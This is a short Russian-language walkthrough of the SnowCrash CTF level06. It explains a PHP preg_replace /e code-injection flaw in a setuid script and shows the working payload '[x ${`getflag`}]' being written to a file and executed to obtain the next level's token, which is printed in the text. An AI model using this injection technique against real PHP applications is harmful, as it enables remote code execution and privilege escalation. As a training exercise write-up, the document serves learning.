-Взглянем на директорию, видим php скрипт и экзекьютбл

level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php


-Взглянем на php скрипт, он принимает два аргумента и вызывает функцию х для получения содержимого первого параметра, предполагая, что он ссылается на файл. Затем в это содержимое вносятся замены на регулярках.

level06@SnowCrash:~$ cat level06.php 
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>


-preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a). Этот модификатор оценивает любое совпадение строки замены, как пхп код, что позволяет внедрять уязвимость. Создадим файл, содержимое которого будет соответствовать регулярке и выполнит getflag, затем запустим испольняемый файл level06

level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/getflag
level06@SnowCrash:~$ ./level06 /tmp/getflag
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
level06@SnowCrash:~$ su level07
Password: wiok45aaoguiboiki2tuin6ub



